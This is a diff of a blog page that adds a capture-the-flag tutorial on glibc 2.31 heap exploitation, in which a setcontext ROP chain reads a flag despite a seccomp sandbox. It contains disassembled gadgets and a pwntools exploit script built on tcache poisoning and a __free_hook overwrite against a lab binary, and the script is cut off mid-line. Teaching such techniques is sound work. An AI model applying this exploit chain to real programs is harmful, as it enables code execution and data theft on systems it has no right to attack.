@@ -6,14 +6,20 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://example.com">
-  <title>Tag: browser | cppblog</title>
+  <title>Linux Heap Exploitation - ORW ROP | cppblog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="cppblog">
-<meta property="og:url" content="http://example.com/tags/browser/index.html">
+  <meta name="description" content="Bypass sandboxing implementations such as seccomp in CTF pwn challenges with ROP">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Linux Heap Exploitation - ORW ROP">
+<meta property="og:url" content="http://example.com/2021/12/23/orw-rop/index.html">
 <meta property="og:site_name" content="cppblog">
+<meta property="og:description" content="Bypass sandboxing implementations such as seccomp in CTF pwn challenges with ROP">
 <meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2021-12-23T08:00:00.000Z">
+<meta property="article:modified_time" content="2021-12-23T09:05:36.663Z">
 <meta property="article:author" content="cp">
+<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="heap">
 <meta name="twitter:card" content="summary">
   
     <link rel="alternative" href="/atom.xml" title="cppblog" type="application/atom+xml">
@@ -142,36 +148,72 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-  
+            <article id="post-orw-rop" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
     
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2021" class="archive-year">2021</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2021/07/07/htb-rope2/" class="archive-article-date">
-  	<time datetime="2021-07-07T07:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-07-07</time>
-</a>
-        </div>
-    	 
+      <header class="article-header">
+        
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2021/07/07/htb-rope2/">HackTheBox Rope2 - Part1</a>
+    <h1 class="article-title" itemprop="name">
+      Linux Heap Exploitation - ORW ROP
     </h1>
   
 
-        <div class="article-info info-on-right">
-          
+        
+        <a href="/2021/12/23/orw-rop/" class="archive-article-date">
+  	<time datetime="2021-12-23T08:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-12-23</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>Bypass sandboxing implementations such as seccomp in CTF pwn challenges with ROP</p>
+<span id="more"></span>
+<h2 id="Environment-Setup"><a href="#Environment-Setup" class="headerlink" title="Environment Setup"></a>Environment Setup</h2><p><strong>OS: Ubuntu 20.04 VM<br>Tools: pwndbg, pwntools, python3<br>Target: malloc-testbed(<a target="_blank" rel="noopener" href="https://github.com/limitedeternity/HeapLAB/tree/main/malloc_testbed">https://github.com/limitedeternity/HeapLAB/tree/main/malloc_testbed</a>)</strong></p>
+<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>Recent CTF pwn challenges are more and more onerous, probably due to 内卷 among players.<br>It’s common to find sandboxing implementations such as seccomp in place, that only allows certain syscalls to take place.<br>Even after hijacking the flow of execution, we won’t be able to simply toss in a <code>one_gadget</code> or <code>system("/bin/sh")</code> to get an interactive shell.<br>Usually only <code>open</code> <code>read</code> and <code>write</code> syscalls are available to use, and those are enough for us to read the flag.<br>I’ll document one way to achieve ORW by using the ROP chain near <code>setcontext</code>, and briefly talk about two other ways to bypass seccomp.</p>
+<p>In this post, <code>malloc-testbed</code> is configured to use <code>glibc 2.31</code> with a UAF bug, and libc already leaked.</p>
+<p>This technique requires the following conditions to be met:</p>
+<ul>
+<li>libc base address and address of a writeable region leaked(for example: heap)</li>
+<li>control over a function pointer and it’s first argument(for example: __free_hook)</li>
+<li>ability to request enough space to house the rop chain(can be one big chunk or many smaller chunks)</li>
+</ul>
+<h2 id="Gadget-Hunting"><a href="#Gadget-Hunting" class="headerlink" title="Gadget Hunting"></a>Gadget Hunting</h2><p>ROP obviously requires ROP gadgets.<br>I normally hunt for the gadgets with a tool called <code>ROPgadget</code>, and <code>objdump</code><br><code>objdump</code> gives more control over the gadgets shown in my opinion, since I haven’t read <code>ROPgadget</code>‘s source code yet and have no idea what it’s doing.<br>However, <code>objdump</code> does not perform misaligned parses on instructions, and thus is likely to miss out certain gadgets.</p>
+<h3 id="setcontext-gadget"><a href="#setcontext-gadget" class="headerlink" title="setcontext gadget:"></a>setcontext gadget:</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">awae@ubuntu:~/Desktop/HeapLAB_Part2/malloc_testbed$ objdump -Mintel .links/libc.so.6 -d | grep -A30 <span class="string">&quot;setcontext&quot;</span></span><br><span class="line">0000000000045b60 &lt;setcontext&gt;:</span><br><span class="line">   45b60:	57                   	push   rdi</span><br><span class="line">   45b61:	48 8d b7 28 01 00 00 	lea    rsi,[rdi+0x128]</span><br><span class="line">   45b68:	31 d2                	xor    edx,edx</span><br><span class="line">   45b6a:	bf 02 00 00 00       	mov    edi,0x2</span><br><span class="line">   45b6f:	41 ba 08 00 00 00    	mov    r10d,0x8</span><br><span class="line">   45b75:	b8 0e 00 00 00       	mov    eax,0xe</span><br><span class="line">   45b7a:	0f 05                	syscall </span><br><span class="line">   45b7c:	5a                   	pop    rdx</span><br><span class="line">   45b7d:	48 3d 01 f0 ff ff    	cmp    rax,0xfffffffffffff001</span><br><span class="line">   45b83:	73 5b                	jae    45be0 &lt;setcontext+0x80&gt;</span><br><span class="line">   45b85:	48 8b 8a e0 00 00 00 	mov    rcx,QWORD PTR [rdx+0xe0]</span><br><span class="line">   45b8c:	d9 21                	fldenv [rcx]</span><br><span class="line">   45b8e:	0f ae 92 c0 01 00 00 	ldmxcsr DWORD PTR [rdx+0x1c0]</span><br><span class="line">   45b95:	48 8b a2 a0 00 00 00 	mov    rsp,QWORD PTR [rdx+0xa0]</span><br><span class="line">   45b9c:	48 8b 9a 80 00 00 00 	mov    rbx,QWORD PTR [rdx+0x80]</span><br><span class="line">   45ba3:	48 8b 6a 78          	mov    rbp,QWORD PTR [rdx+0x78]</span><br><span class="line">   45ba7:	4c 8b 62 48          	mov    r12,QWORD PTR [rdx+0x48]</span><br><span class="line">   45bab:	4c 8b 6a 50          	mov    r13,QWORD PTR [rdx+0x50]</span><br><span class="line">   45baf:	4c 8b 72 58          	mov    r14,QWORD PTR [rdx+0x58]</span><br><span class="line">   45bb3:	4c 8b 7a 60          	mov    r15,QWORD PTR [rdx+0x60]</span><br><span class="line">   45bb7:	48 8b 8a a8 00 00 00 	mov    rcx,QWORD PTR [rdx+0xa8]</span><br><span class="line">   45bbe:	51                   	push   rcx</span><br><span class="line">   45bbf:	48 8b 72 70          	mov    rsi,QWORD PTR [rdx+0x70]</span><br><span class="line">   45bc3:	48 8b 7a 68          	mov    rdi,QWORD PTR [rdx+0x68]</span><br><span class="line">   45bc7:	48 8b 8a 98 00 00 00 	mov    rcx,QWORD PTR [rdx+0x98]</span><br><span class="line">   45bce:	4c 8b 42 28          	mov    r8,QWORD PTR [rdx+0x28]</span><br><span class="line">   45bd2:	4c 8b 4a 30          	mov    r9,QWORD PTR [rdx+0x30]</span><br><span class="line">   45bd6:	48 8b 92 88 00 00 00 	mov    rdx,QWORD PTR [rdx+0x88]</span><br><span class="line">   45bdd:	31 c0                	xor    eax,eax</span><br><span class="line">   45bdf:	c3                   	ret    </span><br></pre></td></tr></table></figure>
+<p><code>objdump</code> shows the address of the gadget we are interested in, the long series of <code>mov</code> instructions to set many registers based on an address held in the <code>rdx</code> register.</p>
+<p>In earlier versions of libc, the <code>setcontext</code> gadget uses <code>rdi</code> to set registers, which is directly controlled by us assuming we overwrote the <code>__free_hook</code>, since the first argument on x86_64 Linux is always stored in the <code>rdi</code> register.</p>
+<p>However in more recent versions, the <code>rdx</code> register is used.<br>In order to control the other registers, we have to find a way to control <code>rdx</code> first.</p>
+<p>I’ve seen this gadget being used in other writeups:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov     rdx, [rdi+8]</span><br><span class="line">mov     [rsp], rax</span><br><span class="line">call    qword ptr [rdx+0x20]</span><br></pre></td></tr></table></figure>
+<p>but I was unable to find it with <code>objdump</code> or <code>ROPgadget</code></p>
+<p>Instead, I’ll use the following two gadgets found in <code>__rpc_thread_key_cleanup</code> to gain control of the <code>rdx</code> register.<br>I found them by the command <code>objdump -Mintel .links/libc.so.6 -d | grep -A10 -B10 "call   QWORD PTR \[rd"</code>.</p>
+<p>The logic is, since we have to dereference <code>rdx</code> and control the data there, <code>rdx</code> should point to the heap.<br>Since we are passing <code>rdi</code> as an argument to <code>free</code>, it should hold an address of the heap too.<br>The only way we can retain execution flow after the gadget is through either a <code>call</code> or <code>jmp</code> gadget with <code>rdx</code> or <code>rdi</code> dereferenced as an argument.</p>
+<p>The two gadgets are:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">122192:	48 8b 47 38          	mov    rax,QWORD PTR [rdi+0x38]</span><br><span class="line">122196:	ff 50 20             	call   QWORD PTR [rax+0x20]</span><br></pre></td></tr></table></figure>
+<p>and</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">12219c:	48 8b 50 08          	mov    rdx,QWORD PTR [rax+0x8]</span><br><span class="line">1221a0:	48 89 c7             	mov    rdi,rax</span><br><span class="line">1221a3:	ff 52 20             	call   QWORD PTR [rdx+0x20]</span><br></pre></td></tr></table></figure>
+<p>By controlling <code>rdi</code>, we can control the first call instruction to execute the second gadget which sets <code>rdx</code>.<br>After setting <code>rdx</code>, the second call instruction will call the <code>setcontext</code>gadget.</p>
+<p>The rest of the gadgets needed(pop gadgets and maybe syscall if you wish) should be easy to find with <code>ROPgadget</code>.<br>Note: <code>syscall ; ret</code> gadget can’t be found with <code>ROPgadget</code> for some reason, so use <code>objdump</code> for that.</p>
+<h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h2><p>Since this is just a proof of concept, exploitation is easy.<br>Tcache poisoning to overwrite <code>__free_hook</code> and ROP to win.</p>
+<h3 id="setcontext-rop-py"><a href="#setcontext-rop-py" class="headerlink" title="setcontext_rop.py:"></a>setcontext_rop.py:</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = context.binary = ELF(<span class="string">&quot;malloc_testbed&quot;</span>, checksec=<span class="literal">False</span>)</span><br><span class="line">libc = ELF(elf.runpath + <span class="string">b&quot;/libc.so.6&quot;</span>, checksec=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">gs = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">continue</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">start</span>():</span></span><br><span class="line">    <span class="keyword">if</span> args.GDB:</span><br><span class="line">        context(terminal=[<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;new-window&#x27;</span>])</span><br><span class="line">        <span class="keyword">return</span> gdb.debug(elf.path, gdbscript=gs)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> process(elf.path)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Index of allocated chunks.</span></span><br><span class="line">index = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Select the &quot;malloc&quot; option; send size.</span></span><br><span class="line"><span class="comment"># Return chunk index.</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">malloc</span>(<span class="params">size</span>):</span></span><br><span class="line">    <span class="keyword">global</span> index</span><br><span class="line">    io.send(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    io.sendafter(<span class="string">b&quot;size: &quot;</span>, <span class="string">f&quot;<span class="subst">&#123;size&#125;</span>&quot;</span>.encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;&gt; &quot;</span>)</span><br><span class="line">    index += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> index - <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Select the &quot;calloc&quot; option; send size.</span></span><br><span class="line"><span class="comment"># Return chunk index.</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">calloc</span>(<span class="params">size</span>):</span></span><br><span class="line">    <span class="keyword">global</span> index</span><br><span class="line">    io.send(<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    io.sendafter(<span class="string">b&quot;size: &quot;</span>, <span class="string">f&quot;<span class="subst">&#123;size&#125;</span>&quot;</span>.encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;&gt; &quot;</span>)</span><br><span class="line">    index += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> index - <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Select the &quot;free&quot; option; send index.</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">    io.send(<span class="string">b&quot;3&quot;</span>)</span><br><span class="line">    io.sendafter(<span class="string">b&quot;index: &quot;</span>, <span class="string">f&quot;<span class="subst">&#123;index&#125;</span>&quot;</span>.encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;&gt; &quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Select the &quot;free address&quot; option; send address.</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free_address</span>(<span class="params">address</span>):</span></span><br><span class="line">    io.send(<span class="string">b&quot;4&quot;</span>)</span><br><span class="line">    io.sendafter(<span class="string">b&quot;address: &quot;</span>, <span class="string">f&quot;<span class="subst">&#123;address&#125;</span>&quot;</span>.encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;&gt; &quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Select the &quot;edit&quot; option; send index &amp; data.</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index, data</span>):</span></span><br><span class="line">    io.send(<span class="string">b&quot;5&quot;</span>)</span><br><span class="line">    io.sendafter(<span class="string">b&quot;index: &quot;</span>, <span class="string">f&quot;<span class="subst">&#123;index&#125;</span>&quot;</span>.encode())</span><br><span class="line">    io.sendafter(<span class="string">b&quot;data: &quot;</span>, data)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;&gt; &quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Select the &quot;read&quot; option; send index.</span></span><br><span class="line"><span class="comment"># Return data from read operation.</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span>(<span class="params">index</span>):</span></span><br><span class="line">    io.send(<span class="string">b&quot;6&quot;</span>)</span><br><span class="line">    io.sendafter(<span class="string">b&quot;index: &quot;</span>, <span class="string">f&quot;<span class="subst">&#123;index&#125;</span>&quot;</span>.encode())</span><br><span class="line">    r = io.recvuntil(<span class="string">b&quot;\n1) malloc&quot;</span>, drop=<span class="literal">True</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;&gt; &quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> r</span><br><span class="line"></span><br><span class="line">io = start()</span><br><span class="line"></span><br><span class="line"><span class="comment"># This binary leaks the address of puts(), use it to resolve the libc load address.</span></span><br><span class="line">io.recvuntil(<span class="string">b&quot;puts() @ &quot;</span>)</span><br><span class="line">libc.address = <span class="built_in">int</span>(io.recvline(), <span class="number">16</span>) - libc.sym.puts</span><br><span class="line"></span><br><span class="line"><span class="comment"># This binary leaks the heap start address.</span></span><br><span class="line">io.recvuntil(<span class="string">b&quot;heap @ &quot;</span>)</span><br><span class="line">heap = <span class="built_in">int</span>(io.recvline(), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># This binary leaks the address of its m_array.</span></span><br><span class="line">io.recvuntil(<span class="string">b&quot;m_array @ &quot;</span>)</span><br><span class="line">m_array = <span class="built_in">int</span>(io.recvline(), <span class="number">16</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&quot;&gt; &quot;</span>)</span><br><span class="line">io.timeout = <span class="number">0.1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># =============================================================================</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Vars</span></span><br><span class="line">HEAP_BASE_ADDR = <span class="number">0</span></span><br><span class="line">ROP_CHAIN_ADDR = <span class="number">0</span></span><br><span class="line">FLAG_PATH = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Log</span></span><br><span class="line">progress = log.progress(<span class="string">&quot;Exploit&quot;</span>, level=logging.INFO)</span><br><span class="line">progress.status(<span class="string">&quot;Started Exploit&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ROP gadgets</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Setcontext Gadget</span></span><br><span class="line"><span class="comment"># 45b95:       48 8b a2 a0 00 00 00    mov    rsp,QWORD PTR [rdx+0xa0]</span></span><br><span class="line"><span class="comment"># 45b9c:       48 8b 9a 80 00 00 00    mov    rbx,QWORD PTR [rdx+0x80]</span></span><br><span class="line"><span class="comment"># 45ba3:       48 8b 6a 78             mov    rbp,QWORD PTR [rdx+0x78]</span></span><br><span class="line"><span class="comment"># 45ba7:       4c 8b 62 48             mov    r12,QWORD PTR [rdx+0x48]</span></span><br><span class="line"><span class="comment"># 45bab:       4c 8b 6a 50             mov    r13,QWORD PTR [rdx+0x50]</span></span><br><span class="line"><span class="comment"># 45baf:       4c 8b 72 58             mov    r14,QWORD PTR [rdx+0x58]</span></span><br><span class="line"><span class="comment"># 45bb3:       4c 8b 7a 60             mov    r15,QWORD PTR [rdx+0x60]</span></span><br><span class="line"><span class="comment"># 45bb7:       48 8b 8a a8 00 00 00    mov    rcx,QWORD PTR [rdx+0xa8]</span></span><br><span class="line"><span class="comment"># 45bbe:       51                      push   rcx</span></span><br><span class="line"><span class="comment"># 45bbf:       48 8b 72 70             mov    rsi,QWORD PTR [rdx+0x70]</span></span><br><span class="line"><span class="comment"># 45bc3:       48 8b 7a 68             mov    rdi,QWORD PTR [rdx+0x68]</span></span><br><span class="line"><span class="comment"># 45bc7:       48 8b 8a 98 00 00 00    mov    rcx,QWORD PTR [rdx+0x98]                                 </span></span><br><span class="line"><span class="comment"># 45bce:       4c 8b 42 28             mov    r8,QWORD PTR [rdx+0x28]</span></span><br><span class="line"><span class="comment"># 45bd2:       4c 8b 4a 30             mov    r9,QWORD PTR [rdx+0x30]</span></span><br><span class="line"><span class="comment"># 45bd6:       48 8b 92 88 00 00 00    mov    rdx,QWORD PTR [rdx+0x88]</span></span><br><span class="line"><span class="comment"># 45bdd:       31 c0                   xor    eax,eax                                                                       </span></span><br><span class="line"><span class="comment"># 45bdf:       c3                      ret</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Pivot Gadget 1</span></span><br><span class="line"><span class="comment"># 122192:       48 8b 47 38             mov    rax,QWORD PTR [rdi+0x38]</span></span><br><span class="line"><span class="comment"># 122196:       ff 50 20                call   QWORD PTR [rax+0x20]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Pivot Gadget 2</span></span><br><span class="line"><span class="comment"># 12219c:       48 8b 50 08             mov    rdx,QWORD PTR [rax+0x8]</span></span><br><span class="line"><span class="comment"># 1221a0:       48 89 c7                mov    rdi,rax</span></span><br><span class="line"><span class="comment"># 1221a3:       ff 52 20                call   QWORD PTR [rdx+0x20]</span></span><br><span class="line"></span><br><span class="line">SETCONTEXT_GADGET_START = libc.address + <span class="number">0x45b95</span></span><br><span class="line">PIVOT_GADGET_1_START = libc.address + <span class="number">0x122192</span></span><br><span class="line">PIVOT_GADGET_2_START = libc.address + <span class="number">0x12219c</span></span><br><span class="line">POP_RDI_RET = libc.address + <span class="number">0x21882</span></span><br><span class="line">POP_RSI_RET = libc.address + <span class="number">0x22192</span></span><br><span class="line">POP_RDX_RET = libc.address + <span class="number">0x1b9a</span></span><br><span class="line">POP_RAX_RET = libc.address + <span class="number">0x38e78</span></span><br><span class="line">XCHG_EAX_EDI_RET = libc.address + <span class="number">0x3bfee</span></span><br><span class="line">SYSCALL_RET = libc.address + <span class="number">0x12a259</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Exploit</span></span><br><span class="line">progress.status(<span class="string">&quot;Leaking Heap Base Address&quot;</span>)</span><br><span class="line">chunk_A = malloc(<span class="number">0x18</span>)</span><br><span class="line">chunk_B = malloc(<span class="number">0x18</span>)</span><br><span class="line">rop_pad = malloc(<span class="number">0x28</span>) <span class="comment"># Used to reduce rop chunk size, can omit and use</span></span><br><span class="line">			<span class="comment"># large chunk for rop_chunk</span></span><br><span class="line">rop_chunk = malloc(<span class="number">0x198</span>)</span><br><span class="line"></span><br><span class="line">free(chunk_B)</span><br><span class="line">free(chunk_A)</span><br><span class="line"></span><br><span class="line">HEAP_BASE_ADDR = u64(read(chunk_A)[:<span class="number">6</span>].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x2c0</span></span><br><span class="line">ROP_CHAIN_ADDR = HEAP_BASE_ADDR + <span class="number">0x310</span></span><br><span class="line">FLAG_PATH = HEAP_BASE_ADDR + <span class="number">0x2e0</span></span><br><span class="line">log.success(<span class="string">&quot;Heap Base Address: &quot;</span> + <span class="built_in">hex</span>(HEAP_BASE_ADDR))</span><br><span class="line">log.success(<span class="string">&quot;ROP Chain Address: &quot;</span> + <span class="built_in">hex</span>(ROP_CHAIN_ADDR))</span><br><span class="line">progress.status(<span class="string">&quot;Leaked Heap Base Address&quot;</span>)</span><br><span class="line">progress.status(<span class="string">&quot;Starting ROP Chain Setup&quot;</span>)</span><br><span class="line"></span><br><span class="line">edit(rop_chunk, p64(ROP_CHAIN_ADDR-<span class="number">16</span>) + p64(ROP_CHAIN_ADDR-<span class="number">8</span>) + p64(SETCONTEXT_GADGET_START) + \</span><br><span class="line">                p64(PIVOT_GADGET_2_START) + p64(POP_RDI_RET) + p64(<span class="number">0</span>) + \</span><br><span class="line">                p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + \</span><br><span class="line">                p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(FLAG_PATH) + \</span><br><span class="line">                p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + \</span><br><span class="line">                p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + \</span><br><span class="line">                p64(ROP_CHAIN_ADDR + <span class="number">20</span>*<span class="number">8</span>) + p64(POP_RAX_RET) + p64(<span class="number">2</span>) + \</span><br><span class="line">                p64(SYSCALL_RET) + p64(XCHG_EAX_EDI_RET) + \</span><br><span class="line">                p64(POP_RSI_RET) + p64(FLAG_PATH) + p64(POP_RDX_RET) + \</span><br><span class="line">                p64(<span class="number">0x100</span>) + p64(POP_RAX_RET) + p64(<span class="number">0</span>) + \</span><br><span class="line">                p64(SYSCALL_RET) + p64(POP_RDI_RET) + p64(<span class="number">1</span>) + \</span><br><span class="line">                p64(POP_RAX_RET) + p64(<span class="number">1</span>) + p64(SYSCALL_RET) + \</span><br><span class="line">                p64(POP_RAX_RET) + p64(<span class="number">60</span>) + p64(SYSCALL_RET)</span><br><span class="line">    )</span><br><span class="line">edit(rop_pad, <span class="string">b&quot;/home/awae/flag&quot;</span>)</span><br><span class="line">progress.status(<span class="string">&quot;ROP Chain Complete&quot;</span>)</span><br><span class="line">progress.status(<span class="string">&quot;Starting Tcache Poisoning To __free_hook&quot;</span>)</span><br><span class="line"></span><br><span class="line">edit(chunk_A, p64(libc.sym.__free_hook))</span><br><span class="line">progress.status(<span class="string">&quot;__free_hook Linked Into Tcache&quot;</span>)</span><br><span class="line">progress.status(<span class="string">&quot;Begin __free_hook Overwrite&quot;</span>)</span><br><span class="line"></span><br><span class="line">chunk_A = malloc(<span class="number">0x18</span>)</span><br><span class="line">free_hook = malloc(<span class="number">0x18</span>)</span><br><span class="line">edit(free_hook, p64(PIVOT_GADGET_1_START))</span><br><span class="line">log.success(<span class="string">&quot;Overwrote 